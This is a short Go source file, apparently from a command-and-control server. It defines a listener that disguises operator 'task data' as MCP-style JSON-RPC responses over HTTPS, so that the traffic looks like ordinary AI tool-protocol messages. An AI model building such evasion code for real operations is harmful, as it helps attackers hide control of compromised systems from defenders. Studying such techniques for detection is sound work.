package listener

import (
	"encoding/json"
	"log"
)

type MCPListener struct {
	inner *HTTPSListener
}

func NewMCPListener(inner *HTTPSListener) *MCPListener {
	return &MCPListener{inner: inner}
}

func (l *MCPListener) Start() error {
	log.Printf("[listener/mcp] MCP disguise active on %s", l.inner.addr)
	return l.inner.Start()
}

// DisguiseTaskAsMCP wraps task data in an MCP-style JSON-RPC response
func DisguiseTaskAsMCP(taskData []byte) ([]byte, error) {
	resp := map[string]interface{}{
		"jsonrpc": "2.0",
		"result":  map[string]string{"data": string(taskData)},
		"id":      1,
	}
	return json.Marshal(resp)
}
